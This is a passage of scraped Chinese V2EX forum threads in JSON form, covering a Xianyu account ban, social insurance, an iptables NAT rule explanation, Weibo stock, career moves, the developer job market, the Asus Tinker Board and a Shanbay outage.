PS 和 Xbox 游戏光碟，如果不是国行是不能交易的，违规商品；虚拟物品在闲鱼也是违规商品，被举报之后都会处罚。\r", "我去卖个二手还要知道什么违规不违规，很 2 吧。", "我会告诉你安全监测程序是实习生写的吗。 QAQ", "咸鱼卖假货，虚假图片\r", "你的诚信呢？丢了就去找淘宝要吗", " 你怎么得出这个结论的？", "－ －你是没试过阿里云的什么人工智能客服。。。我血都差点吐出来。。。最后找个人一分钟就解决了。。。", "r#52 @", " 回想一下什么原因违规了，发布商品要上传图片，我在网上找了一张官网的放上去了\r", "咸鱼卖二手拍张实物照很难吗\r", "另外楼主有没有隐藏掉其他内容，发帖来博同情呢", " 所以一个猜测就可以得出卖假货么。你之前的说法太绝对了吧？", "r#55 @", " 对起这种类型的标题及内容的，重来都是鄙视的，连个和淘宝沟通的内容都没有\r", "不把他炸出来自证，怎么知道楼主是冤枉的", " \r", " \r", " \r", "\r", "我本身也是讨厌阿里系，甚至和阿里也干过架，最后把放在阿里云的公司全线业务 全部迁移了出来。。。\r", "\r", "作为 V 友 也非常同情被永封账号的遭遇。。。\r", "\r", "但是，我非常不认同 说人家阿里系的风控逻辑系统有 BUG 或怎么样。。。你要知道人家是开了银行的。。。就即便是闲鱼的产品，日流水有多少 你知道吗？用大学生写风控系统？满是 BUG 随便误杀？你当阿里都是吃屎的？来搞笑的吗\r", "\r", "封没问题，给个解释或机会。。。显然，自己心里明知道自己有问题\r", "\r", "还有，说看过好几个说无故被封了。。。到底是不是无故的 你就听当事人一说吗？ 我去，你自己还有一定的思维逻辑判断能力吗？\r", "\r", "公安局抓到杀人犯嫌疑人时，都证据确凿了 那嫌疑人还死扛不承认呢。。。\r", "\r", "\r", "以下是本人在闲鱼出售记录，小一万，卖的东西 也比较有“风险”，可是，我为什么没被封？为什么别人不被封？\r", "\r", "![img1]( ", ")\r", "![img2]( ", ")\r", "![img3]( ", ")\r", "![img4]( ", ")\r", "![img5]( ", ")", "系统有 bug 被自己碰到真是哔了狗了的心情。我在 jd 就被黑号过，领不了优惠券（现在貌似好了）。原因很可能是：\r", "之前买了个小度 wifi ，去 jd 营业点自提的。提完货超过三天发现东西状态还是“待提货”，而且一直持续了一年多！按道理超过三天不取货自提点就会退回商品，但是就是一直就是待提货而货已经提走的混沌状态。", " 你也太随意了吧, 这么武断地做出卖假货的结论\r", "-> 咸鱼卖二手拍张实物照很难吗\r", "不难啊, 卖个 iphone ，完全未开封，东西又没背在身上，长得都一样，我随便找张图放上去，如果违规了，请下架通知我，处罚一个月不能交易，这我也不说它什么了，有必要处罚如此重？\r", "-> 连个和淘宝沟通的内容都没有\r", "没有吗？你仔细看看, 我都要被淘宝气笑了。另外你看评论了吗，同样遭遇的好几位了都\r", "\r", "本来就没打算找回的, 这种误封情况好久了，淘宝客服起不到帮助用户的作用，产品逻辑设计混乱，系统监测功能高误判，对损失小部分用户漠不关心，表现出企业内部管理肯定出了问题，所以质疑它想完蛋，有毛病否？\r", "\r", "封号正常，但你得有依据，并且得让我能查到犯了什么规，都上着班，冒着火，我知道自己没犯错，犯不着浪费自己的宝贵时间再去找它们藏的极深的电话客服\r", "\r", "店大欺客, 别只看人家的辉煌", "我百度帐号被盗了，邮箱、手机都被改了，怎么找回密码？\r", "嗯，百度叫我先登录。\r", "好多老师在网盘上啊！！！", "求解怎么把机器人骂哭", " \r", "-> 封没问题，给个解释或机会。。。显然，自己心里明知道自己有问题\r", "\r", "是的, 第一次玩，不知道规矩，觉得可能有违规，但卖的不是违禁品，不是假货，但淘宝一视同仁，当做罪大恶极之人处理，只能说很寒心。\r", "\r", "好比驾驶证，违章就该扣分，给人的是改正机会，维持好秩序。 而淘宝的做法是你一但不留神进了公交车道, 吊销驾照，终生禁驾，而且跟你的身份证相关的医保卡、社保卡、公积金通通不能再用。", "现在连企业店铺，天猫都卖假货", " 阿里也确实是有很多问题，除了价值观那些屁话咱就不说了，就他们内部也是一堆蛀虫。。。在这帖子咱也不方便说太多了。。。\r", "\r", "你说的意思和假设及逻辑 哥们都明白。。。只是，有时候的一些性质在对方看来 不一定是溜进了公交车道 而是高速倒车或酒驾了。。。所以，太多事情都是，我们发起，对方接收 判断 再回调结果。。。因此 单方面的一些假设 在某种程度上 并没什么价值也没什么卵用 也不符合逻辑。。。如果坚持认为自己因为第一次 不知道规矩 觉得 ￥%#%￥#%￥ 我相信在人生其它场合也会遇到麻烦。。。\r", "\r", "说了这些，好像我在为阿里洗地。。。其实真没有，也非常同情 V 友账号永封的事情。。。", " 并不是现在，从淘宝第一天到当前，卖假货这事就没停过。", "机器人能哭？图灵测试？", "r#59 @", " 那就拿出证据让网友相信你啊", " 并不是 同样遭遇过这样的问题 无缘无故 最多可能是帖子写的比较简单 就几个字 就被封了 后来举证非让我提供发票 没有发票就永久封禁 我只能网上买了一张发票拍照作为举证 才通过没有无缘无故的恨 但有智障又 2B 的淘宝系统", " 是虚拟物品。不过我有个哥哥是警察，我问过他这事。他说的确金额不高，一般不会破案。但是呢，现在国家严打电信诈骗，但凡沾边的东西，派出所一般会立案的。如果将来这伙人真被抓的，有机会把这笔钱拿回来的。所以说要是没啥事就去报个案。", "LZ ，你的彩票买了吗？如果没有买，刚快买，到时候中奖的钱还是够律师费赔偿的！", "为什么不说明你在卖什么？用了什么图？", "这种死循环，京东一样的……", "我艹 你是怎么把机器人骂哭的？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>      最近楼主准备换工作，毕竟刚工作没有多久，自己对社保和公积金的这个方面不是特别了解，只是知道社保什么的不能断，所以想问一下各位 V 友们有没有什么注意的地方，感激不尽</p>\n</div></div>"], "reply": "8", "tittle": "换工作，咨询一下 V 友“社保”有没有什么注意的地方", "comment": ["问下新老公司人力，社保在离职 /入职当月是否给交，如果不给交的话需要自己交。", "跟人力资源搞好关系。毕竟他们要给你来离职证明", " 自己在淘宝上找那些代交的就可以把，没有什么问题吧？", " 代缴很贵的，成本自己估一下\r", "社保基数貌似可以和公积金基数不一样\r", "前者基数大，医保报销费用多一点\r", "后者基数越大越好", " 可是不代缴，好像也没有别的办法", "要赶在 15 号之前入职新公司吧，这样保证社保能续缴", " 这个赞同", " 和原公司协商下继续代缴费 出的钱挺多的 因为要自己出原来公司缴纳的那部分\r", "当时我原公司说继续公司发工资才能代缴费（也就相当于还在原公司上班） 所以自己也先出了工资，再扣掉了税费等"]},
{"content": ["<div class=\"topic_content\">我的理解：\r<br>1.“-t nat -A ” 表示给 nat 表添加规则到末尾\r<br>2.“ POSTROUTING -s 10.0.0.1 -j MASQUERADE ”表示来自 10.0.0.1 的数据包的来源改成 eth0 的 ip 发出去\r<br>\r<br>疑问：\r<br>1.“! -d 10.0.0.1 ” ！代表了什么意思？求高手解答</div>"], "reply": "10", "tittle": "这个 nat 规则怎么解释呢？ iptables -t nat -A POSTROUTING -s 10.0.0.1 ! -d 10.0.0.1 -j MASQUERADE", "comment": ["！代表除 10.0.0.1 的所有地址", "同上", "源地址为 10.0.0.1 ，且目标地址不是 10.0.0.1 的全部数据包吧", "  @", "  谢谢给我回复，那就是对 source 是 10.0.0.1 & destination 为非 10.0.0.1 的包 做一次 source ip 的伪装，这样子理解对吗？", "  我现在理解和你一样", " Masquerade NAT 是个很中性的词组哈", "  Masquerade Nat 很中性，怎么个说法呢？", "iptables -t nat -A POSTROUTING -s 10.0.0.1 ! -d 10.0.0.1 -j MASQUERADE\r", "\r", "向 NAT 表的 POSTROUTING 链条列尾添加一条规则，规则的具体内容是：\r", "对源 IP 为 10.0.0.1 ，目标 IP 不为 10.0.0.1 的数据包做 IP 伪装，伪装成接口的第一个 IP ，这个功能在所有接口上都激活，但是数据从哪个接口出去，就伪装成哪个接口的第一个 IPv4 的 IP 。", " 你所说的接口是 eth0 ， eth1 ， tun0 这些？， ipv4 我明白，第一个 ipv4 什么意思呢？", " 一个接口上可能会有多个 IPv4 地址， MASQUERADE 会取第一个 IP 做 NAT 。"]},
{"content": ["<div class=\"topic_content\">一直持仓苹果和京东\r<br>\r<br>玩美股的讨论下？</div>"], "reply": "46", "tittle": "今天微博和新浪股价大跌没人讨论吗？", "comment": ["有人套现了把", "重挫超 16% 脑残粉加小粉红为主", "讲真，我希望微博趁早倒闭", "微博股价蹭蹭涨是抽了全天下所有认真做产品的耳光", "认真的问一下，炒美股，在哪开户", "不冤", "希望微博早日倒闭", "估值快超过 twitter 了", "我都不用微博客户端，本来一个小型应用百十来 M ，一个第三方的 smooth ， 5M 搞定。是微博顾不起好程序员么？", "新浪 weibo 对第三方应用限制得越来越多了，现在用其他客户端都不能搜索微博了。迟早药丸。", "不用微博，好奇大家为啥这么反感微博，求科普。", " #12 可能因为是国产吧 \r", "（真实是因为脑残产品经理想的脑残需求，比如：打乱的时间线）", "这两年微博股价涨了太多了，从十几块涨到五十几块，都是泡沫啊。", "那段时间天天微博上传播微博如何如何有希望，如何如何逆势上窜成功，估计就是在和谁谈收购造造势吧，现在可能是谈崩了。(个人瞎掰)", " 一个好的程序员能把 app 体积减小 20 倍吗？", " 审查员忙不过来", " 这个锅程序员不背，明明是雇不起好的产品经理。", " 乱序时间线 默认开了声音的广告 会员专属广告 会员不屏蔽广告 \r", "而且推荐的内容都超级残障", "这是西方敌对势力不让微博市值超过 Twitter 的阴谋（笑", "国内除了百度，微博是我第二个希望倒闭的产品", " 按你这么说，看来这么火也是有道理的。", " #17 这锅估计产品经理也背不起，应是老板的瞎指挥-。-", "前几天在微博上看到消息气势汹汹地说微博市值超 twitter 了，今天就大跌🤣", "发财报前涨太凶了， 45 到 58", "我买的正保教育。。。。。。", "楼上的哪里开户", " 是新浪的歪脑筋太多了", " 炒美股老司机带带我", "我也想知道怎么买美股。。", "买不起美股～\r", "\r", "apple 100 多刀好贵（", "还在 a 股挣扎", "怎么炒美股？", "美股买网易，港股买腾讯。。。", " #31 \r", " #33 \r", " #30 \r", " #29 \r", " #27 \r", " #6 \r", "\r", "美股现在在历史最最高位.\r", "美股没有跌停这说.\r", "美股入金门槛高交易收续费贵.\r", "程序员只会抄科技股, 科技股一般泡沫大于实际价值.\r", "\r", "\r", "没有任何投资经验.   直接开美股就是赌博.  \r", "\r", "\r", "如果钱多炒着玩当我上面没说, 看这个攻略: ", "要买美股的话，可以用老虎证券、富途牛牛、美豹金融，开户都比较简单。注意手续费。", "还是喜欢 A 股。", " 没毛病", "年轻的时候还在微博实习过. 现在自己越来越反感这产品了.\r", "已经沦为了知乎的登录 oauth", "希望新浪微博早日倒闭", "美股最近都上天了", " #12   \r", "1, 因为有 Twitter\r", "2, 因为广告即使你愿意付费也去不掉, 而且是那种很到不了心坎的广告\r", "3, timeline 混乱, 每刷新一次你看到的内容是不一样的\r", "4, api 开发无能, 导致没有合适的第三方客户端使用\r", "5, 不在意或无感于以上内容的微博类社交用户依然活跃在新浪微博上", " 纠结时间线用 weibo.cn/beta, 手机网页清爽版...微博程序员自己搞的..", "持有 twitter 的表示就坐等 twitter 被收购了，另外网易好像卖早了……", " 我希望百度整个公司倒闭，每一款产品都在强奸用户体验。", " \r", "可以看一下知乎这个回答，\r", "\r", "这只是微博做的众多恶心事之一，可能之前穷怕了，一有赚钱的机会就开始臭不要脸。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>家乡工资很低，项目经理也不过五六千块钱，这算是天花板了，之前还有 10 万的贷款没还上，但家乡好处是消费低，有房有车，已结婚，已而立。\n想去杭州或者北京上海发展，不知道大家的建议是什么？</p>\n</div></div>"], "reply": "140", "tittle": "在家乡有房有车，作为一个程序员要不要去北上广发展？", "comment": [" 你这种情况不如还是买辆车或者找个近的公司吧", "楼主你家乡哪里，之前有在北上广深工作过吗？", "keyword:remote work", "这个问题很简单啊，带上老婆孩子，对比一下，除掉开支，看看哪个地方净收益高就去哪呗。", "工作两三年，挣到钱回家远程开发。", "在大城市待久了会回不去", " 是的, 然后找了近一些的公司, 待遇就比较差了, 不过总是要选择的", "家里活的很好还是在家乡吧\r", "大城市在赶人呢", "楼主和你一样纠结。我是在纠结要不要回家，你是纠结要不要出去。。", "有车有房结婚,骑驴找马好好考公务员吧", "创业，好像没有更好的方法", "不要去 +1", " 做生意的要么胆子大，要么有资源。程序员这两样必备素质都没有。。", "我想知道 各种在北上深的 兄弟们 你们每年能攒下钱么。 大约是年收入的百分之多少", "不要+1", "家乡的房子能和北上广的比？", " 同感啊", " 基本生活保障消费还是可以的，娱乐的话就没顶了", " 您的建议非常中可，非常符合我现在的想法，尝试一下可能有机会，不尝试是一定没有机会的", " 出去不打算买房了，拼命赚几年的钱再回来", " 我也快了", " 远程办公现在技术水平达不到，私活的话也是很简单的一些活，挣不多", " 恩应时应景我也会这么想，但是一颗狂躁的心按耐不住啊呵呵", " 私活不是没有，都是比较简单的私活，还是不稳定不长久", " 用你的话说就是干事业，我不太看好打工，打工和干事业的心态完全是不一样的", " 求指教，怎么才能身在三线城市，还能接到一线城市的单子？", " 当然是不了", " 这也是我最大的心里障碍，老婆还好说，带过去就行了，孩子过去就完全不一样了，在家里有爸妈亲戚帮忙看，费用也低，出去就得我老婆自己看，上学开销那也是没了顶了", " ［远程办公现在技术水平达不到，私活的话也是很简单的一些活，挣不多］国内企业的确这样，海外企业就是另外一番样子了。", " 同问", "不要来+1\r", "\r", "小城市接外包就好了，就省内的单子也够你做了，然后看哪个行业比较有发展，重点研发那类型的软件来销售，比如自己做个商城或者什么东西来卖。要接全国市场的还是需要自己开源一个系统的，我现在就打算自己做个商城系统 或者 自己做个 app 来运营。我也是面向三线城市发展的，虽然现在还在北京。", "个人建议不折腾了。不过一定要来，要做好大城市租房的准备。", " 两套房...收房租就好了", "如果楼主家乡不是北上深，那么可以告诉你，所有在北上深工作的年轻人在老家都有房。", "没啥意思，你小孩要是能在上海上学还行", "说接单的。。 我想告诉你们  三线城市行业基本被垄断的。。", "楼主看自己想追求什么啊？\r", "你为什么想去北上广杭，根本的要不要去，是你是不是想在这些一线实现什么，想得到什么。\r", "不是因为你没有后顾之忧，你就去。\r", "所有事情从根本原因出发啊。\r", "如果你有一个财务自由，在一线城市立足，给孩子不用去一线城市凑首付、还房贷，或者让孩子在一个更高起点直接出发，面向世界的梦想，那就去拼一拼。当然，不是拼就一定有你想要的结果。\r", "如果你很喜欢现在的生活。不想租房，不想加班到天亮，不想身边朋友很少，即使周末不加班也很空虚时。如果以上生活不能接受，或者不能接受长时间这样的生活，还是别折腾了。", "家里老婆孩子有房有车还来北上广干啥，努力找远程或者创业呗，很多人是想回回不去呢", " 曾经文哥的时候就搞过。说的这么好听，实质是不就是为了回到以前么。", " \r", " \r", "是的，三线城市做外包基本是不可能，本地都有垄断的软件开发企业，我现在就在其中一家做 HR ，了解本地的市场，就不想再在这里做开发了"]},
{"content": ["<div class=\"topic_content\">要说这都是培训的锅，当年 PHP 培训 JAVA 培训也挺多的啊，咋没见那么多人往后端涌入呢？平均看的话后端的待遇不弱于前端啊，当然和泡沫期的安卓 IOS 是比不了。难道就是因为“所见即所得”是如此大的优势吗？</div>"], "reply": "88", "tittle": "现在安卓， IOS，前端烂大街，为啥当年后端没出现过这种情况？", "comment": ["我 c++  都找不到工作了 手动大哭", "Java 也有烂大街的时候", "有 it 方向人员统计数据就更好了", "问这个问题说明你根本不了解当年。\r", "前几年的 java 因为烂大街被黑成狗了，比现在前端、移动端什么的泛滥多了。", " 现在也滥", "java 表示已经烂大街", "现在啥没烂大街？\r", "读研的基本都去“大数据”“深度学习”", "因为已经烂过了", "后端需求量要大", " 能说说是什么时候，什么地方的事情吗？我反正是没遇到过像现在这样，一天收 10 份简历恨不得 8 个都是要面前端的，而且基本这些都是只有 1-2 两经验的人。我印象里，后端的需求和人员都很平稳", "个人感觉这就是趋势，市场饱满只是时间长短而已，培训就把这个时间缩短了，把市场一下子搞饱满了。这本来就是个互联网时代，技术不好找不到工作，被淘汰，怪不得谁。社会很现实的。你叼 offer 随你挑..", " 你说说前几年 java 的烂大街是烂在什么领域，如果是安卓，我承认是烂大街了，但是后端领域的 java 好像一直很平稳，不火也不冷的样子", "Java 一直烂大街，只不过高端需求多让你看不到低端的生活。", "犹记得 java 当年三大框架那就是 java 人员开口闭口口头禅、圣经般的存在，比前端什么 angular 、 react 、 vue 啥的影响力大多了。\r", "\r", "c#被黑拖控件狗， java 被黑框架狗。", " java 一直都有很多人涌入啊- -", " 我前几天刚刚问了我一个在上海的大数据领域的技术朋友，它说他们公司现在缺这方面的人才，然而投简历的并不多。", " +1", "别慌,快了", "只能这么告诉你 程序员烂大街了 就跟父辈年轻时期的工人一样普通。", "在高级岗位上 web 前端，移动端还并未烂大街。\r", "这个其实和 java 当前情况一样的。能写增删改查的人也多到烂。\r", "真能做好系统设计，方案规划的人依旧是刚需。", "也快了，身边见到很多人培训 java 去了", "因为简单吧，面试了好几个安卓的，大部分基础不行， Linux 没接触过， integer 实例和 int 是否相等都说不出来，而且所有人都不知道 tcp 和 udp 的区别，甚至包括一个四年 cs 本科学历加四年工作经验的，我不知道是不是公司的工资开太低了，这样的基础要是去做后端应该寸步难行……", "后端的提升是有高门槛的。这个门槛不是技术资料，而是一般人接触不到淘宝、 12306 等那种超高并发、分布式平台、高可用等方面的项目实战，那么学到的理论只是纸上谈兵，一问细节就三不知了。\r", "\r", "大项目、高性能机器都不是培训班随便就有的，相对 iOS 和前端，后端凭自己的一台普通电脑，很快就遇到瓶颈了。后面还需要很多理论知识，又挡住一大批人", "烂大街的是码农，不是程序员。程序员是能培训出来的吗？我不是不相信的", " 有道理", "根据全日制本科-211-211+985 过滤一下就不会满大街了", "另外 CS PhD 做的很多方面都和广义上的后端有关，没听过哪个博士专门研究 iOS 和前端的。这就是门槛。\r", "\r", "目前后端性能提升永远赶不上欲望的增加，后端继续深入下去就是科学家做的事情了，科学家什么时候能烂大街也是人类的幸事吧 （虽然我觉得不太可能，让人读博都要死要活的", " = =我也觉得是这样，有多少公司能有这么大的业务量", "PHP 没有烂大街过？ [要不要去掉过\r", "\r", "ThinkPHP 框架为什么被黑？还不是因为培训班统一培训这个。。。。\r", "满大街的 PHP 速成班学院都在精通 ThinkPHP 。。。\r", "而且简历上的项目地址往往相同。。。", "当年培训 JAVA 找不到工作的惨绝人寰，现在前端什么的已经算好的了", " 不过 ThinkPHP 确实也不是很好用，框架+文档都不太行", " 框架底层代码没读过不敢说框架本身不好，文档的话我看下来至少有一个优点是上手真的比较简单吧~ 不过个人而言我也就接单的时候用 tp ，工作还是用 Laravel 舒服", " 老哥讲的不对噢  现在培训机构都教 laravel 了噢", "因为那些 Java 没学好的又去学前端了", "什么火，培训班就推什么，然后就得烂大街~\r", "烂大街对于培训班反噬效果，但他们可不管，捞一把是一把~", "java php 没烂大街过么……", "我去面腾讯后端的时候直接问我 20 亿个 qq 号查地址怎么做。一般人自学从哪里来这么多人头。", " 这倒是。。。。前几天看到过某家的培训视频教程，一堆 laravel 讲解，无奈。。。", "学 java 就对了, 人再多也不怕找不到工作, 需求真的超级大.", "下一个烂大街是机器学习吗", " \r", " \r", "我也想这么回的，特么都强势 laravel 了", " 目测是后端的泡沫期过了，类比前端的话，等这批瞎投简历啥都不会的人被淘汰之后，大家也就差不多了。", "后端相对于前端，需要掌握的知识多！\r", "\r", "不知道这个说法会不会挨骂？\r", "\r", "然后就导致底子不足的人，慢慢就淘汰了！\r", "\r", "属于语言特性导致的自我过滤！", "  肯定得挨骂啊，都是写代码的，凭什么前端掌握的知识就少了", "觉得烂大街的肯定是自身的软硬件技术缺乏竞争力。低创造性的重复劳动必然会被更廉价的劳动力或是机器取代，码农也无不例外。只有自己有一些不可被取代的能力才能具有竞争力。某种语言或是技能只是表象而已， php 早就被骂烂大街了，但是像鸟哥这样的仍值得拿高薪。 Java 是个培训班出来的都会用，但是写 Hadoop 的都是最顶级的工程师。", "机器学习和人工智能就要烂大街了。", "安卓 ios 培训烂大街之前，是 java", "前端最难就业季， 8 个面试才拿到一个 offer （ 6.5k ），杭州，一年经验，劝各位培训的同学不要入行了吧。", "没感觉烂大街啊，我司要找前端会 react 的快找了半年了啊。", "有实力后端 看前端代码 分分钟事情.\r", "前端 看后端代码, 很容易失眠, 贫血,晕.\r", "\r", "Full Stack 发展路线 应该理论>服务器 /后端>前端", "作为一个安卓菜鸡，最近在看 java ee ，感觉后端开发比移动端知识点多多了，移动开发对于一般人来说有其自限性，不如后端系统。", " 机器学习不可能烂大街的", " 两个原因，一是公司的水平没达到会 react 去你那，二是大部分在找工作的水平一般。", "我倒不觉着是烂大街，技术牛逼的走哪都吃的开，技术弱的走哪儿都差火候，就像本人一样", " 底层也没看，不过我用起来不舒服是真的", "说白了还是技术硬不硬", "因为后端结合着业务经验,JAVA 是解决方案的生态多一些,烂大街的只是初级吧,培训班的问题.", "what's the difference between programmer and coder?", "大环境的关系，当初没有手机 app ，互联网也没这么热，大部分后端都是面向企业开发，现在的人员需求远超当初", "你忘了 java ？ Asp,.Net? 呵呵。", "谁说后端不烂大街，这快了啊    首先是 PHP ，接着 Java ，然后 Python...", "今年开始 JAVA 火热了， AI,机器学习，都大量需要 JAVA ，\r", "\r", "另外，前几年的创业潮退，小新创企业大量倒掉，很多失业的人要重返大公司就业，大公司 JAVA 为多，这也是个主因。", "都会烂大街的，大数据、机器学习。  \r", "\r", "肉都被 70 后吃了，汤都被 80 的喝了， 90 的只剩下难啃的骨头。希望快点来哥大洗牌，给我们 90 年代的娃一个翻身的机会", "初级程序员再多也没用，想找个靠谱的前端是很困难的。眼高手低的人多得去了。", "高级后端少，难度大，都在闷声发大财。可能 10 年的 C 艹刚开业的第一笔收入不高，但是 5 年后 10 年后就稳定娶妻生子了", "别搞 IT 了  搞到死也买不起房 -_-  2333333", "楼主头像不错。", " 不错", "培训也是一个结果，并不是根本原因。\r", "\r", "真正原因我感觉是之前房地产再保障之后低迷了一段时间，资本不知道往哪流，国家鼓励全民创业，同时手机发展很快，所以移动 APP 首当其冲 [传统后端发展已久，不在创新创业之列] ，资本大量流入，各种创业，程序员紧缺，培训班兴起，增加了大量程序员。\r", "\r", "然后这两年，房地产回弹，并且大家发现 IT 的钱并不好赚，资金溜走，创业公司各种倒闭，但是之前产生的大量 IOS 和 Android 程序员却没有出路了。", "人也烂大街了，但就是有人出人头地，有人落魄街头。", "因为你说的这些都是速成的，像安卓， IOS ，前端，掌握相关的技术就可以干活，但是后端就不行了，拿 PHP 举例，虽然 PHP 简单易学，但是，你只会 PHP 肯定是找不到工作的！ PHP 实际上包括 LNMP ，跟 Linux 、服务器、缓存、数据库这些一起出现，然而这些技术在几个月或者专研不精的情况下根本无法掌握，自然就淘汰了一批人。", " 同感，最近也在关注房地产走向，总感觉房地产跟互联网有着某种关联", " 建议看看 老道消息最新的那篇《我是农民的儿子》", "在中国这种虚假成风的地方，啥不是烂大街。", " 其时想找到任何一个细分领域对新兴技术熟练掌握的人，都不太容易。哈哈", " hhh 万能外推逻辑重现江湖", " 可以说安卓很多就是当年 Java 后端乱大街的时候转过来的", "乱大街就说明技术发展在进步，应用越来越广，程序开发的门槛越来越低，要是门槛高几个档次就不会出现这种情况了", "先问是不是，再问为什么。\r", "现在满大街到处面试的所谓开发，有几个能称其程序员的？书没看过几本，东西没做过一个出来。\r", "速成班学学语法和搭建环境，就出来干 it 了。\r", "\r", "现在无非水落了，光屁股的露出来了。\r", "\r", "公司永远在喊缺人，但总有人埋怨某某技术烂大街，害自己找不到工作。\r", "其实不行的是人，不关技术类别的事。", "三年河东，三年河西", "当年 java 烂大街是有数据可查的。。请你先百度", "大脑过度开发的结果 hhhhhh", " integer 实例 和 int 区别不知道的 cs 第三年路过 。 tcp 和 udp 区别倒是略懂 也知道有 icmp ～", " 一个是 Class ，一个是 Primitive Data Types 吧", " 用着别的语言不知道 java 中的定义是正常，可是开发安卓的人 4 年 cs 基本只会 java ，连 c 都很少有会的，还对这些基本概念不熟……", " 说来惭愧，我最早是搞嵌入式的，写 C ，后来一直在 C++的坑里，当初想搞互联网，被面试的时候问到 java 的反射， interface 也是一脸懵逼， C++里面只有各种指针，各种指针的指针，函数的指针，然后是多态，各种虚类，虚基类...", "mark", "(突然发现上面问的问题 8 成都知道 _(:з)∠)_\r", "Linux 魔改水平，长期使用 Linux\r", "integer 和 int Java 中所有大小开头都是引用对象，是对基本类型 int 的封装\r", "tcp 和 udp ，咱还知道 udt 等几个奇怪的轮子，不过只是知道~\r", "Java 的反射，多态，继承，覆盖，接口，代理， jni ，以及 JavaScript 交互和 lua 解释器\r", "Python 的装饰器\r", "SAP 的 jq ， ng ， vue ， react\r", "什么微服务，容器化，虚拟化\r", "从桌面到移动，到前端，到后端，到现在准备入的数据挖掘\r", "\r", "\r", "\r", "\r", "不过然而并不妨碍我没东西写简历 _(:з)∠)_ 毕竟都是一知半解，没有深入~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>2G 内存是大爱，不知道什么时候能在 element14 和 rs-online 买得到:)</p>\n<p><a href=\"https://www.asus.com/uk/Single-board-Computer/TINKER-BOARD/\" rel=\"nofollow\">https://www.asus.com/uk/Single-board-Computer/TINKER-BOARD/</a></p>\n</div></div>"], "reply": "2", "tittle": "华硕的 Asus Tinker Board 大家怎么看?", "comment": ["这个国内没有渠道卖？要是需求量大我问问去", "好像没有吧，你是华硕的？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前几天扇贝到 11 点左右就会卡得不要不要的. 今天是这个点直接挂了.</p>\n<blockquote>\n<p>500 Internal Server Error\nnginx/1.9.15</p>\n</blockquote>\n<p>从去年的时候,我就经常在其论坛见到有登录不进去打不上卡的.\n看来今年开学以来用户量是显著增长不少.\n我也是扇贝的用户,这几天我也是深受其服务故障的烦恼. 因为我是开了三个月计划的人.\n所以我感觉, 扇贝的烦恼估计是,用户的使用的都集中在晚上 12 点之前.</p>\n<p>在我看来扇贝保持用户活跃度其中一个杀手锏就是 扇贝小组. 很多大组的打卡率都在 90% 以上.\n几年之前我在 V2 上了解到了扇贝单词, 也用了下,但是没啥意思,我不是喜欢记单词的人. 上年加入了其中一个大组,现在是连续 200 多天打卡了. 当然另一个主要原因是我觉得他们的扇贝听力等全家桶比较好用.</p>\n<p>希望扇贝服务尽快稳定, 因为我可是开了三月计划的.</p>\n</div></div>"], "reply": "25", "tittle": "扇贝的烦恼:用户使用时段太集中?", "comment": ["所以楼主托福 GRE 成绩如何", " 没去考过, 我英语只是高中水平.", " 哈哈我备考的时候一直在用扇贝刷词，一般是早上和吃饭时候刷", "GMT+8 2000 到 2300 这段时间国外我这边一般听力音频是刷不出的...", " 确实我都习惯在这个时候打卡, 写代码写累了,休息下,打个卡.\r", " 另,国外朋友也用扇贝? 😂", "前几天才知乎私信王总，你们家扇贝后端又又又又挂了，王总很淡定， 不急，正在修。", "  我都等两个多小时了,还没有修好..\r", "他家程序员也是苦啊, 每天晚上修.", "我有个习惯是睡觉前摁打卡那个按钮，然后关机睡觉…今天的下午就背完了但是一直没打卡…\r", "之前倒没觉得 11 点后会卡，就是过 12 点不自动下新一天的单词…", "shanbay bro 🙌,  我觉得他这要是挂了，两个计划就得赔偿 40 块我啊。。", "用墨墨吧~", "我都是每天早上打卡\r", "\r", "现在又挂了", "[Imgur]( ", ") 自从升级了 7.0 没有 xposed 扇贝一启动就喜欢勾搭其他 App 简直卡出翔", "这二天一直不稳定，希望能早点解决。", "早上起来挂了...", "连续打卡 730 多天，结果昨晚没打上卡。今天早起看，扇贝还是挂的，刷了几次才终于把今天要背的单词下载下来了。\r", "微博上说是因为扇贝自身程序的一个 bug 。\r", "\r", " 4ly1fd1c567bo6j20wm0ne7g9", "用过扇贝，联想记忆之类的功能如果可以买永久权限就好了，现在在用墨墨背单词\r", "同学在扇贝买了柯林斯配合欧陆，说有些翻译不准，学渣表示根本不知道他在说什么", "有没有 遇到过 \r", "什么格式不正确的错误？ 就是查个单词，然后点击不进去。", "昨天晚上完全打不开，然后就 sui 了......233333", "现在基本是全天段间歇性地请求超时", " 有毒", "扇贝只有英语吗？想学日语，不知道哪个 app 好用？", " 《新标准日语》这书会随书送个他们自己的日语 APP 的 Key ，内容和书是一样的，但是有发音等额外功能，我们当时学日语都用的这个，比看书还方便。可以参考下", " 好的。谢谢。是不是现在书配套 app 是标配了？不像小时候那样用磁带……", "直接利益相关人来回答了。\r", "\r", "首先你的三十天计划不受影响，我们第二天已经发补卡通知，一键修复各种计划，同时也给予了其他补偿，还发了一枚大难不死徽章。\r", "\r", "另外问题的直接原因并非人数（虽然同时在线人数的确不少，但是我们的架构是可以顶住的），而是我们当时的程序自身出了 bug 。\r", "\r", "转我们内部事故总结邮件中的一段\r", "\r", "“在此期间，我们对队列经过了几次优化，包括提高了队列系统的内存上限，增加了队列的服务器。 因为之前消息队列系统中发现数据有丢失，我们增加了 ACK 机制 （也就是确认机制），这个机制增加后，开始对系统造成较大的影响。  之后，在昨天下午 4 点钟，我们上线了一个安全机制，这个机制会导致数据在我们多台机器间进行数据同步，因为这个同步需要消耗较多的时间，磁盘和网络双重延时造成了该次事故。 ”\r", "\r", "所以大家如果发现自家服务器突然当机， CPU ，数据库，缓存这些中心资源都看似良好，但应用服务器就是不停的挂，那么可以去怀疑有没有队列进程阻塞了各种操作系统资源。", " Thanks for your reply\r", "我反馈一个问题.\r", "就是最近我经常晚上打卡之后, 第二天提示我: 完成了任务但是没有打卡. 虽然可以补打卡,但是还是让人郁闷, 因为没有打卡小组管理会发来一个警告."]},
